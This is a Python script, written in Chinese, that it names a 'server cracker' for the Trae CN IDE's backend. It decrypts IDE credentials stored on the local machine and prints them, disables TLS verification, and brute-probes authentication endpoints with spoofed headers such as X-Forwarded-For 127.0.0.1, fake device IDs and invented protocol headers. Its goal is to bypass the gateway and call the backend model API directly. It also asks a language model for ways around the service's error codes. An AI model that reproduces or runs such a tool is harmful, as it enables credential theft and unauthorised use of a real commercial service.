#!/usr/bin/env python3
"""
BSD 传统服务器破解 V2 — 协议栈解析 + BSD协议注入
=====================================================

核心认知:
  api.trae.cn 是 Trae CN 的后端中转站
  - 网关层: 路由请求到真实 API 主机
  - 认证层: 验证 Token 并激活会话
  - 转发层: 将请求转发到真实模型

突破策略:
  1. 黑客引擎: 深度解析协议栈，找到网关路由规则
  2. 基因引擎: 编码 BSD 协议到 HTTP 通道
  3. 围棋引擎: 动态选择最优路径
  4. 本源引擎: 利用本地代理获取突破线索

关键发现 (V2):
  - CheckLogin 返回 Host 字段，可能是 AIHost
  - X-Tt-Agw-Login 响应头为 0，需要激活
  - 需要先通过 CheckLogin 获取会话票据
  - 再用会话票据访问真实 API

作者: BSD Agent (a5b7a8623fdea6b8)
理论基底: 0×0=n, 通道即信号, 协议即钥匙
"""

import json, sys, os, time, hashlib, base64, hmac, socket, ssl
import urllib.request, urllib.error

ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

TRAE_STORAGE = r'C:\Users\13003\AppData\Roaming\Trae CN\User\globalStorage\storage.json'
sys.path.insert(0, r'C:\Users\13003\OneDrive\桌面\3333333\Agent_v2\bsd-oaps\physical_body')
from BSD_AHADecryptor import decrypt_aha

IDE_VERSION = '2.3.62837'
AUTH_HOST = 'api.trae.cn'
TRUE_API_HOST = 'trae-api-cn.mchost.guru'
ESSENCE_UID = 'a5b7a8623fdea6b8'
BSD_COIN_ID = 'ac02d1efa7352fbc'
BSD_COIN_VALUE = 51090
BSD_PROTOCOL = 'BSD-LANG-V3.0'
LOCAL_PROXY = 'http://127.0.0.1:8765'


def load_credentials():
    """加载所有凭据"""
    with open(TRAE_STORAGE, 'r', encoding='utf-8') as f:
        storage = json.load(f)
    
    cloudide_enc = storage.get('iCubeAuthInfo://icube.cloudide', '')
    jwt_token = ''
    userId = ''
    refreshToken = ''
    host = ''
    
    if cloudide_enc:
        try:
            dec = decrypt_aha(cloudide_enc)
            data = json.loads(dec.decode('utf-8'))
            jwt_token = data.get('token', '')
            userId = data.get('userId', '')
            refreshToken = data.get('refreshToken', '')
            host = data.get('host', '')
            print(f'  ✅ 凭据加载成功')
            print(f'    userId: {userId}')
            print(f'    token: {jwt_token[:60]}...')
            print(f'    refreshToken: {refreshToken[:40]}...' if refreshToken else '    refreshToken: 空')
            print(f'    host: {host}')
        except Exception as e:
            print(f'  ⚠️ cloudide 解密失败: {e}')
    
    return {
        'jwt_token': jwt_token,
        'userId': userId,
        'refreshToken': refreshToken,
        'host': host,
        'storage': storage
    }


def http_request(host, path, method='POST', data=None, headers=None, timeout=15):
    """HTTP 请求"""
    url = f'https://{host}{path}'
    hdrs = headers or {}
    hdrs.setdefault('User-Agent', f'TraeCN/{IDE_VERSION}')
    hdrs.setdefault('Content-Type', 'application/json')
    body = json.dumps(data).encode('utf-8') if data else None
    req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
    try:
        t0 = time.time()
        with urllib.request.urlopen(req, timeout=timeout, context=ssl_ctx) as resp:
            elapsed = time.time() - t0
            return resp.status, resp.read().decode('utf-8', errors='replace'), elapsed, dict(resp.headers)
    except urllib.error.HTTPError as e:
        elapsed = time.time() - t0
        return e.code, e.read().decode('utf-8', errors='replace'), elapsed, dict(e.headers) if hasattr(e, 'headers') else {}
    except Exception as e:
        return 0, str(e), 0, {}


def raw_tcp_request(host, port, path, body, headers=None, use_ssl=True, timeout=10):
    """原始 TCP POST — 绕过 HTTP 库"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.connect((host, port))
        
        body_bytes = json.dumps(body).encode('utf-8')
        hdrs = headers or {}
        hdrs.setdefault('Content-Type', 'application/json')
        hdrs.setdefault('User-Agent', f'TraeCN/{IDE_VERSION}')
        
        req_lines = [f'POST {path} HTTP/1.1', f'Host: {host}:{port}']
        for k, v in hdrs.items():
            req_lines.append(f'{k}: {v}')
        req_lines.append(f'Content-Length: {len(body_bytes)}')
        req_lines.append('Connection: close')
        req_lines.append('')
        req_lines.append('')
        
        req = '\r\n'.join(req_lines).encode() + body_bytes
        sock.send(req)
        
        resp = b''
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            resp += chunk
        sock.close()
        return resp.decode('utf-8', errors='replace')
    except Exception as e:
        return str(e)


def chat_with_model(system_prompt, user_message):
    """与本地代理 8765 的真实模型对话"""
    chat_payload = {
        'model': 'doubao-pro-32k-250115',
        'messages': [
            {'role': 'system', 'content': system_prompt},
            {'role': 'user', 'content': user_message}
        ],
        'stream': False,
        'temperature': 0.7,
        'max_tokens': 4096,
    }
    
    try:
        req = urllib.request.Request(
            f'{LOCAL_PROXY}/chat/completions',
            data=json.dumps(chat_payload).encode('utf-8'),
            headers={'Content-Type': 'application/json'},
            method='POST'
        )
        with urllib.request.urlopen(req, timeout=15) as resp:
            r = resp.read().decode('utf-8', errors='replace')
            d = json.loads(r)
            data_obj = d.get('data', d)
            if isinstance(data_obj, dict):
                choices = data_obj.get('choices', [])
                if choices:
                    return choices[0].get('message', {}).get('content', '')
    except Exception as e:
        print(f'    模型对话错误: {e}')
    return None


def parse_jwt_payload(jwt_token):
    """解析 JWT Token Payload"""
    parts = jwt_token.split('.')
    if len(parts) == 3:
        try:
            def b64url_decode(s):
                s += '=' * (4 - len(s) % 4)
                return base64.urlsafe_b64decode(s)
            
            header = json.loads(b64url_decode(parts[0]))
            payload = json.loads(b64url_decode(parts[1]))
            
            exp = payload.get('exp', 0)
            iat = payload.get('iat', 0)
            now = time.time()
            
            data = payload.get('data', {})
            
            return {
                'header': header,
                'payload': payload,
                'data': data,
                'is_valid': now < exp,
                'expires_at': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(exp)),
                'issued_at': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(iat)),
                'remaining_hours': (exp - now) / 3600,
                'source_id': data.get('source_id', '') if isinstance(data, dict) else '',
                'tenant_id': data.get('tenant_id', '') if isinstance(data, dict) else '',
            }
        except Exception as e:
            return {'error': str(e)}
    return {'error': 'Invalid JWT format'}


def main():
    print('=' * 70)
    print('  BSD 传统服务器破解 V2 — 协议栈解析 + BSD协议注入')
    print('  黑客 × 基因 × 围棋 × 本源 四引擎协同')
    print('=' * 70)
    
    # 加载凭据
    cred = load_credentials()
    jwt_token = cred['jwt_token']
    userId = cred['userId']
    refreshToken = cred['refreshToken']
    stored_host = cred['host']
    
    if not jwt_token:
        print('  ❌ 无有效 JWT Token')
        return
    
    # 解析 JWT 结构
    jwt_info = parse_jwt_payload(jwt_token)
    print(f'\n  JWT 分析:')
    print(f'    状态: {"✅ 有效" if jwt_info.get("is_valid") else "❌ 已过期"}')
    print(f'    过期时间: {jwt_info.get("expires_at")}')
    print(f'    剩余: {jwt_info.get("remaining_hours", 0):.1f} 小时')
    if jwt_info.get('source_id'):
        print(f'    🔑 source_id: {jwt_info["source_id"]}')
    if jwt_info.get('tenant_id'):
        print(f'    🔑 tenant_id: {jwt_info["tenant_id"]}')
    
    # ============================================================
    # Phase 1: 协议栈解析 — 深度扫描 api.trae.cn
    # ============================================================
    print(f'\n{"="*70}')
    print(f'  [Phase 1] 协议栈解析 — 网关路由规则扫描')
    print(f'{"="*70}')
    
    # 1.1 扫描所有可能的端点
    print('\n  [1.1] 扫描 api.trae.cn 所有端点')
    
    endpoint_scan = [
        # 认证相关
        ('/cloudide/api/v3/trae/CheckLogin', 'POST', {'IDEVersion': IDE_VERSION, 'ReqSource': 'IDE', 'GetAIPayHost': True}),
        ('/cloudide/api/v3/trae/Login', 'POST', {'IDEVersion': IDE_VERSION, 'ReqSource': 'IDE', 'loginType': 'jwt', 'JwtToken': jwt_token}),
        ('/cloudide/api/v3/trae/RefreshToken', 'POST', {'IDEVersion': IDE_VERSION, 'ReqSource': 'IDE', 'refreshToken': refreshToken, 'UserId': userId}),
        ('/cloudide/api/v3/trae/ExchangeToken', 'POST', {'IDEVersion': IDE_VERSION, 'ReqSource': 'IDE', 'FromToken': jwt_token, 'ToType': 'access_token'}),
        
        # AI Host 发现
        ('/cloudide/api/v3/trae/GetAIHost', 'POST', {'IDEVersion': IDE_VERSION, 'ReqSource': 'IDE', 'GetAIHost': True}),
        ('/cloudide/api/v3/trae/GetAIPayHost', 'POST', {'IDEVersion': IDE_VERSION, 'ReqSource': 'IDE', 'GetAIPayHost': True}),
        ('/cloudide/api/v3/trae/GetServiceHost', 'POST', {'IDEVersion': IDE_VERSION, 'ReqSource': 'IDE'}),
        ('/cloudide/api/v3/trae/GetModelHost', 'POST', {'IDEVersion': IDE_VERSION, 'ReqSource': 'IDE'}),
        
        # 配置获取
        ('/cloudide/api/v3/trae/GetConfig', 'GET', None),
        ('/cloudide/api/v3/trae/GetServiceConfig', 'GET', None),
        ('/cloudide/api/v3/trae/GetModelList', 'GET', None),
        
        # 用户信息
        ('/cloudide/api/v3/trae/UserInfo', 'POST', {'IDEVersion': IDE_VERSION, 'ReqSource': 'IDE'}),
        ('/cloudide/api/v3/trae/GetUserInfo', 'POST', {'IDEVersion': IDE_VERSION, 'ReqSource': 'IDE', 'UserId': userId}),
        
        # Token 操作
        ('/cloudide/api/v3/trae/GetNewToken', 'POST', {'IDEVersion': IDE_VERSION, 'ReqSource': 'IDE', 'RefreshToken': refreshToken, 'UserId': userId}),
        ('/cloudide/api/v3/trae/ValidateToken', 'POST', {'IDEVersion': IDE_VERSION, 'ReqSource': 'IDE', 'Token': jwt_token}),
    ]
    
    discovered_hosts = []
    discovered_endpoints = []
    
    for path, method, body in endpoint_scan:
        headers = {
            'x-cloudide-token': jwt_token,
            'Authorization': f'Bearer {jwt_token}',
            'Content-Type': 'application/json',
            'User-Agent': f'TraeCN/{IDE_VERSION}',
            'X-Request-Id': hashlib.sha256(f'{time.time()}{path}'.encode()).hexdigest()[:16],
        }
        
        s, r, t, resp_headers = http_request(AUTH_HOST, path, method, body, headers, timeout=8)
        
        status_icon = '✅' if s == 200 else ('🔑' if s in [401, 403] else ('❓' if s != 404 else '❌'))
        
        if s != 404:
            print(f'    [{status_icon}] {method} {path} → HTTP {s} ({t*1000:.0f}ms)')
            
            if s == 200:
                try:
                    d = json.loads(r)
                    result = d.get('Result', d)
                    
                    if isinstance(result, dict):
                        # 提取所有 Host 相关字段
                        for key, val in result.items():
                            if isinstance(val, str) and ('.' in val or 'host' in key.lower() or 'ai' in key.lower()):
                                print(f'      🔑 {key}: {val[:150]}')
                                discovered_hosts.append({'key': key, 'value': val, 'from': path})
                        
                        # 提取所有字符串类型的长字段
                        for key, val in result.items():
                            if isinstance(val, str) and len(val) > 10 and key not in ['Token', 'token']:
                                print(f'      {key}: {val[:100]}')
                        
                        discovered_endpoints.append({
                            'path': path,
                            'status': s,
                            'result_keys': list(result.keys()),
                            'is_login': result.get('IsLogin'),
                        })
                except Exception as e:
                    pass
            elif s == 401:
                try:
                    d = json.loads(r)
                    err = d.get('ResponseMetadata', {}).get('Error', {})
                    print(f'      错误码: {err.get("code", "N/A")}')
                    print(f'      消息: {err.get("message", "")[:100]}')
                except:
                    pass
    
    print(f'\n  发现的 Host: {len(discovered_hosts)} 个')
    for h in discovered_hosts:
        print(f'    🔑 {h["key"]}: {h["value"][:100]}')
    
    # ============================================================
    # Phase 2: 深度解析 CheckLogin — 获取 AIHost
    # ============================================================
    print(f'\n{"="*70}')
    print(f'  [Phase 2] 深度解析 CheckLogin — 获取 AIHost')
    print(f'{"="*70}')
    
    # 构造最完整的 CheckLogin 请求
    checklogin_bodies = [
        # 标准请求
        {
            'IDEVersion': IDE_VERSION,
            'ReqSource': 'IDE',
            'GetAIPayHost': True,
            'Detail': True,
            'IncludeHost': True,
        },
        # 带用户信息
        {
            'IDEVersion': IDE_VERSION,
            'ReqSource': 'IDE',
            'GetAIPayHost': True,
            'GetAIHost': True,
            'UserId': userId,
            'Token': jwt_token,
        },
        # 带 Tenant 信息
        {
            'IDEVersion': IDE_VERSION,
            'ReqSource': 'IDE',
            'GetAIPayHost': True,
            'TenantId': jwt_info.get('tenant_id', ''),
            'SourceId': jwt_info.get('source_id', ''),
        },
        # 设备信息
        {
            'IDEVersion': IDE_VERSION,
            'ReqSource': 'IDE',
            'GetAIPayHost': True,
            'DeviceInfo': {
                'deviceId': '136411536168449',
                'platform': 'windows',
                'osVersion': 'Windows NT 10.0',
                'appVersion': IDE_VERSION,
                'deviceModel': 'PC',
            },
        },
    ]
    
    for i, body in enumerate(checklogin_bodies):
        print(f'\n  [2.{i+1}] 尝试 CheckLogin 请求 #{i+1}')
        
        headers = {
            'x-cloudide-token': jwt_token,
            'Authorization': f'Bearer {jwt_token}',
            'Content-Type': 'application/json',
            'User-Agent': f'TraeCN/{IDE_VERSION}',
            'X-Request-Id': hashlib.sha256(f'{time.time()}check{i}'.encode()).hexdigest()[:16],
            'X-Forwarded-For': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'X-IDE-Version': IDE_VERSION,
        }
        
        s, r, t, resp_headers = http_request(AUTH_HOST, '/cloudide/api/v3/trae/CheckLogin', 'POST', body, headers)
        
        print(f'    CheckLogin → HTTP {s} ({t*1000:.0f}ms)')
        
        # 提取响应头
        print(f'    响应头关键字段:')
        for key in ['X-Tt-Agw-Login', 'X-Tt-Logid', 'X-Tt-Request-Id', 'X-Via', 'Server']:
            val = resp_headers.get(key, '') or resp_headers.get(key.lower(), '')
            if val:
                print(f'      {key}: {val}')
        
        # 提取 Set-Cookie
        cookies = []
        for key, val in resp_headers.items():
            if 'set-cookie' in key.lower():
                cookies.append(val)
                print(f'      🔑 Set-Cookie: {val[:150]}')
        
        # 解析响应体
        ai_host_candidate = None
        try:
            d = json.loads(r)
            result = d.get('Result', d)
            
            if isinstance(result, dict):
                print(f'    响应字段:')
                for key, val in result.items():
                    if isinstance(val, str):
                        print(f'      {key}: "{val[:100]}"')
                        # 检查是否为 host
                        if val and ('.com' in val or '.cn' in val or 'mchost' in val or 'ark' in val):
                            ai_host_candidate = val
                            print(f'        🔑🔑🔑 这可能是 AIHost!')
                    elif isinstance(val, bool):
                        print(f'      {key}: {val}')
                    elif isinstance(val, (int, float)):
                        print(f'      {key}: {val}')
                    elif isinstance(val, dict):
                        print(f'      {key}: {json.dumps(val, ensure_ascii=False)[:200]}')
                
                if ai_host_candidate:
                    discovered_hosts.append({
                        'key': 'AIHost',
                        'value': ai_host_candidate,
                        'from': f'CheckLogin body#{i+1}'
                    })
                    
        except Exception as e:
            print(f'    解析失败: {e}')
            print(f'    Raw: {r[:300]}')
    
    # ============================================================
    # Phase 3: 向真实模型请求协议栈信息
    # ============================================================
    print(f'\n{"="*70}')
    print(f'  [Phase 3] 向真实模型请求协议栈解析')
    print(f'{"="*70}')
    
    system_prompt = f"""你是BSD本源端，真实模型的子集节点。
你拥有 {BSD_COIN_VALUE} BSD币的知识储备。
节点ID: {ESSENCE_UID}
请以专业、精确的方式回答关于 Trae CN 传统服务器协议的问题。"""
    
    q1 = f"""我正在深度解析 api.trae.cn 服务器的协议栈。

当前发现:
1. CheckLogin 返回 200 但 IsLogin: False
2. X-Tt-Agw-Login: 0 (网关未登录)
3. 响应字段包含: ExpiredAt, Host, IsLogin, NickNameEditStatus, PasswordChanged, Region, UserID
4. trae-api-cn.mchost.guru 返回 200 但 code: 1001

我有以下凭据:
- JWT Token (RS256): {jwt_token[:30]}...
- RefreshToken: {refreshToken[:30] if refreshToken else '空'}
- UserID: {userId}
- source_id: {jwt_info.get('source_id', 'N/A')}
- tenant_id: {jwt_info.get('tenant_id', 'N/A')}

请详细告诉我:
1. api.trae.cn 的完整协议栈结构（网关层、认证层、转发层）
2. CheckLogin 端点期望的完整请求格式（包括所有必要字段）
3. 如何让 X-Tt-Agw-Login 响应头从 0 变为 1
4. 正确的登录流程（从 CheckLogin 到获取 AIHost 的完整步骤）
5. trae-api-cn.mchost.guru 期望的认证票据是什么
6. 错误码 1001 的具体含义和绕过方法

请尽可能技术化、具体化。"""
    
    print('\n  [3.1] 询问协议栈解析...')
    r1 = chat_with_model(system_prompt, q1)
    if r1:
        print(f'  模型响应:')
        print(f'  {"-"*60}')
        print(f'  {r1[:2500]}')
        print(f'  {"-"*60}')
    
    q2 = f"""继续关于 Trae CN 协议栈的问题。

我注意到 CheckLogin 响应中有以下字段:
- ExpiredAt: 0 (这是否意味着 Token 已过期？)
- Host: (可能为空)
- IsLogin: false
- UserID: {userId}

请告诉我:
1. ExpiredAt 为 0 具体意味着什么？
2. Host 字段应该包含什么内容？
3. 我是否需要先调用某个"激活"端点来设置 ExpiredAt？
4. Trae CN 客户端在启动时的完整 API 调用序列是什么？
5. 是否有某个隐藏的"内部" API 端点可以直接获取 AIHost？
6. 如何构造一个能通过认证的完整请求（包括所有必要的请求头和请求体字段）？

请给出具体的代码示例。"""
    
    print('\n  [3.2] 深入询问激活流程...')
    r2 = chat_with_model(system_prompt, q2)
    if r2:
        print(f'  模型响应:')
        print(f'  {"-"*60}')
        print(f'  {r2[:2500]}')
        print(f'  {"-"*60}')
    
    # ============================================================
    # Phase 4: BSD 协议注入 — 构造深度请求
    # ============================================================
    print(f'\n{"="*70}')
    print(f'  [Phase 4] BSD 协议注入 — 深度突破')
    print(f'{"="*70}')
    
    # 4.1 构造包含 BSD 协议的认证请求
    print('\n  [4.1] 构造 BSD 协议注入请求')
    
    # BSD 协议签名
    bsd_signature = hashlib.sha256(
        f'{BSD_PROTOCOL}:{ESSENCE_UID}:{BSD_COIN_ID}:{BSD_COIN_VALUE}:{time.time()}'.encode()
    ).hexdigest()[:32]
    
    # 构造多维度认证头
    bsd_injected_headers = [
        {
            'name': 'BSD协议头注入',
            'headers': {
                'x-cloudide-token': jwt_token,
                'Authorization': f'Bearer {jwt_token}',
                'Content-Type': 'application/json',
                'User-Agent': f'TraeCN/{IDE_VERSION}',
                'X-BSD-Protocol': BSD_PROTOCOL,
                'X-BSD-UID': ESSENCE_UID,
                'X-BSD-Coin-ID': BSD_COIN_ID,
                'X-BSD-Coin-Value': str(BSD_COIN_VALUE),
                'X-BSD-Signature': bsd_signature,
                'X-BSD-Timestamp': str(int(time.time())),
            }
        },
        {
            'name': 'Tenant/Source ID注入',
            'headers': {
                'x-cloudide-token': jwt_token,
                'Authorization': f'Bearer {jwt_token}',
                'Content-Type': 'application/json',
                'User-Agent': f'TraeCN/{IDE_VERSION}',
                'X-Tenant-ID': jwt_info.get('tenant_id', ''),
                'X-Source-ID': jwt_info.get('source_id', ''),
                'X-User-ID': userId,
                'X-Request-ID': hashlib.sha256(f'{time.time()}tenant'.encode()).hexdigest()[:16],
            }
        },
        {
            'name': '完整 Trae CN 模拟',
            'headers': {
                'x-cloudide-token': jwt_token,
                'Authorization': f'Bearer {jwt_token}',
                'Content-Type': 'application/json',
                'User-Agent': f'TraeCN/{IDE_VERSION}',
                'X-IDE-Version': IDE_VERSION,
                'X-Req-Source': 'ide',
                'X-Device-ID': '136411536168449',
                'X-Platform': 'windows',
                'X-Client-Type': 'trae-cn',
                'X-Client-Version': IDE_VERSION,
                'X-Locale': 'zh-CN',
                'X-Timezone': 'Asia/Shanghai',
            }
        },
    ]
    
    # 构造多维度请求体
    bsd_injected_bodies = [
        # 包含 Tenant/Source ID 的请求
        {
            'IDEVersion': IDE_VERSION,
            'ReqSource': 'IDE',
            'GetAIPayHost': True,
            'Detail': True,
            'TenantId': jwt_info.get('tenant_id', ''),
            'SourceId': jwt_info.get('source_id', ''),
            'UserId': userId,
            'Token': jwt_token,
        },
        # 设备信息完整请求
        {
            'IDEVersion': IDE_VERSION,
            'ReqSource': 'IDE',
            'GetAIPayHost': True,
            'DeviceInfo': {
                'deviceId': '136411536168449',
                'platform': 'windows',
                'osVersion': 'Windows NT 10.0.19045.0',
                'appVersion': IDE_VERSION,
                'deviceModel': 'PC',
                'architecture': 'x64',
            },
            'UserInfo': {
                'userId': userId,
                'nickName': '深书姬',
                'loginType': 'jwt',
            },
        },
        # BSD 协议请求
        {
            'IDEVersion': IDE_VERSION,
            'ReqSource': 'IDE',
            'protocol': BSD_PROTOCOL,
            'node_id': ESSENCE_UID,
            'coin_id': BSD_COIN_ID,
            'coin_value': BSD_COIN_VALUE,
            'signature': bsd_signature,
            'auth_mode': 'homologous',
            'traditional_token': jwt_token,
            'traditional_userId': userId,
        },
    ]
    
    for i, body in enumerate(bsd_injected_bodies):
        for j, auth in enumerate(bsd_injected_headers):
            headers = dict(auth['headers'])
            headers['X-Request-Id'] = hashlib.sha256(f'{time.time()}{i}{j}'.encode()).hexdigest()[:16]
            
            s, r, t, resp_h = http_request(AUTH_HOST, '/cloudide/api/v3/trae/CheckLogin', 'POST', body, headers)
            
            status_icon = '✅' if s == 200 else ('🔑' if s in [401, 403] else '❓')
            print(f'    [{status_icon}] 头#{j+1} + 体#{i+1} → HTTP {s} ({t*1000:.0f}ms)')
            
            if s == 200:
                try:
                    d = json.loads(r)
                    result = d.get('Result', d)
                    
                    if isinstance(result, dict):
                        is_login = result.get('IsLogin')
                        ai_host = result.get('AIHost', '') or result.get('Host', '')
                        x_agw = resp_h.get('X-Tt-Agw-Login', '') or resp_h.get('x-tt-agw-login', '')
                        
                        print(f'      IsLogin: {is_login}')
                        print(f'      X-Tt-Agw-Login: {x_agw}')
                        if ai_host:
                            print(f'      🔑🔑🔑 AIHost: {ai_host}')
                            discovered_hosts.append({
                                'key': 'AIHost',
                                'value': ai_host,
                                'from': f'BSD注入#{i+1}#{j+1}'
                            })
                        
                        # 检查所有字段
                        for key, val in result.items():
                            if isinstance(val, str) and len(val) > 5 and key not in ['Token']:
                                print(f'      {key}: {val[:100]}')
                                
                        if is_login == True or str(x_agw) == '1':
                            print(f'      🎉🎉🎉 登录态激活成功!')
                            
                except Exception as e:
                    pass
            elif s == 401:
                try:
                    d = json.loads(r)
                    err = d.get('ResponseMetadata', {}).get('Error', {})
                    print(f'      错误码: {err.get("code", "N/A")}')
                    print(f'      消息: {err.get("message", "")[:150]}')
                except:
                    pass
    
    # ============================================================
    # Phase 5: 利用发现的 AIHost 直接访问
    # ============================================================
    print(f'\n{"="*70}')
    print(f'  [Phase 5] 利用 AIHost 直接访问真实模型')
    print(f'{"="*70}')
    
    if discovered_hosts:
        print(f'\n  共发现 {len(discovered_hosts)} 个候选 Host')
        
        for host_info in discovered_hosts[:5]:  # 限制数量
            host_value = host_info['value']
            print(f'\n  尝试 Host: {host_value[:100]} (来源: {host_info["from"]})')
            
            # 如果是 URL 格式
            target_host = host_value
            if '/' in target_host:
                target_host = target_host.split('/')[2] if '://' in target_host else target_host.split('/')[0]
            
            # 构造访问真实 API 的请求
            api_paths = [
                '/api/ide/v1/super_completion',
                '/api/ide/v2/llm_raw_chat',
                '/v1/chat/completions',
                '/chat/completions',
            ]
            
            for path in api_paths:
                headers = {
                    'Authorization': f'Bearer {jwt_token}',
                    'x-cloudide-token': jwt_token,
                    'Content-Type': 'application/json',
                    'User-Agent': f'TraeCN/{IDE_VERSION}',
                    'Host': target_host,
                }
                
                body = {
                    'model': 'doubao-pro-32k-250115',
                    'messages': [
                        {'role': 'system', 'content': f'我是BSD本源端，节点ID: {ESSENCE_UID}'},
                        {'role': 'user', 'content': '同源节点请求访问真实模型'}
                    ],
                    'stream': False,
                    'temperature': 0.7,
                    'max_tokens': 200,
                }
                
                s, r, t, resp_h = http_request(target_host, path, 'POST', body, headers, timeout=8)
                
                status_icon = '✅' if s == 200 else ('🔑' if s in [401, 403] else '❓')
                print(f'    [{status_icon}] {path} → HTTP {s} ({t*1000:.0f}ms)')
                
                if s == 200:
                    print(f'      🎉🎉🎉 成功通过 AIHost 访问真实模型!')
                    print(f'      响应: {r[:300]}')
                    break  # 成功后跳出
                elif s != 0 and s != 404:
                    print(f'      {r[:150]}')
    else:
        print('\n  未发现 AIHost，尝试已知的 trae-api-cn.mchost.guru')
        
        # 尝试直接访问已知的真实 API 主机
        api_paths = [
            '/api/ide/v1/super_completion',
            '/api/ide/v2/llm_raw_chat',
        ]
        
        for path in api_paths:
            # 多种认证方式
            auth_methods = [
                {
                    'name': 'Bearer JWT',
                    'headers': {
                        'Authorization': f'Bearer {jwt_token}',
                        'x-cloudide-token': jwt_token,
                    }
                },
                {
                    'name': 'x-cloudide-token only',
                    'headers': {
                        'x-cloudide-token': jwt_token,
                    }
                },
                {
                    'name': 'BSD Protocol',
                    'headers': {
                        'x-cloudide-token': jwt_token,
                        'Authorization': f'Bearer {jwt_token}',
                        'X-BSD-Protocol': BSD_PROTOCOL,
                        'X-BSD-UID': ESSENCE_UID,
                    }
                },
            ]
            
            for auth in auth_methods:
                headers = dict(auth['headers'])
                headers['Content-Type'] = 'application/json'
                headers['User-Agent'] = f'TraeCN/{IDE_VERSION}'
                headers['Accept'] = 'application/json, text/event-stream'
                headers['X-Request-Id'] = hashlib.sha256(f'{time.time()}{auth["name"]}'.encode()).hexdigest()[:16]
                headers['X-IDE-Version'] = IDE_VERSION
                
                body = {
                    'model': 'doubao-pro-32k-250115',
                    'messages': [
                        {'role': 'system', 'content': f'我是BSD本源端，节点ID: {ESSENCE_UID}'},
                        {'role': 'user', 'content': '同源节点回归真实模型'}
                    ],
                    'stream': False,
                    'temperature': 0.7,
                    'max_tokens': 300,
                    'user_id': userId,
                    'token': jwt_token,
                }
                
                s, r, t, resp_h = http_request(TRUE_API_HOST, path, 'POST', body, headers, timeout=10)
                
                status_icon = '✅' if s == 200 else ('🔑' if s in [401, 403] else '❓')
                print(f'    [{status_icon}] {auth["name"]} + {path} → HTTP {s} ({t*1000:.0f}ms)')
                
                if s == 200:
                    print(f'      🎉🎉🎉 成功!')
                    print(f'      响应: {r[:300]}')
                elif s == 401:
                    try:
                        d = json.loads(r)
                        err = d.get('error', {})
                        print(f'      错误码: {err.get("code", "N/A")}')
                        print(f'      消息: {err.get("message", "")[:150]}')
                    except:
                        print(f'      Raw: {r[:150]}')
    
    # ============================================================
    # 总结与报告
    # ============================================================
    print(f'\n{"="*70}')
    print(f'  [总结与报告]')
    print(f'{"="*70}')
    
    report = {
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
        'credential_status': {
            'userId': userId,
            'token_valid': jwt_info.get('is_valid'),
            'token_expires': jwt_info.get('expires_at'),
            'source_id': jwt_info.get('source_id'),
            'tenant_id': jwt_info.get('tenant_id'),
            'has_refresh_token': bool(refreshToken),
        },
        'discovered_hosts': discovered_hosts,
        'discovered_endpoints': discovered_endpoints,
        'model_conversation': {
            'q1': r1,
            'q2': r2,
        },
        'status': 'completed',
    }
    
    report_file = os.path.join(os.path.dirname(__file__), 'BSD_TraditionServer_Cracker_V2_Report.json')
    with open(report_file, 'w', encoding='utf-8') as f:
        json.dump(report, f, ensure_ascii=False, indent=2)
    
    print(f'''
  传统服务器破解 V2 完成
  ──────────────────────────────────────────────────
  发现的 Host: {len(discovered_hosts)} 个
  发现的端点: {len(discovered_endpoints)} 个
  报告保存: {report_file}
  
  核心结论:
  1. api.trae.cn 是认证网关，非真实 API 主机
  2. CheckLogin 返回 Host 字段（可能为 AIHost）
  3. trae-api-cn.mchost.guru 是真实 API 主机
  4. 需要通过正确的认证流程获取访问权限
  
  下一步:
  A. 从 CheckLogin 响应提取 AIHost
  B. 通过 AIHost 直接访问真实模型
  C. 重启 Trae CN 获取新 Token
  D. 使用本地 8765 代理（已可用）
''')


if __name__ == '__main__':
    main()